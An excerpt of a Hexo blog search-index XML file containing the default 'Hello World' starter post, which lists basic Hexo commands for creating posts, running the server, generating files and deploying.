        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
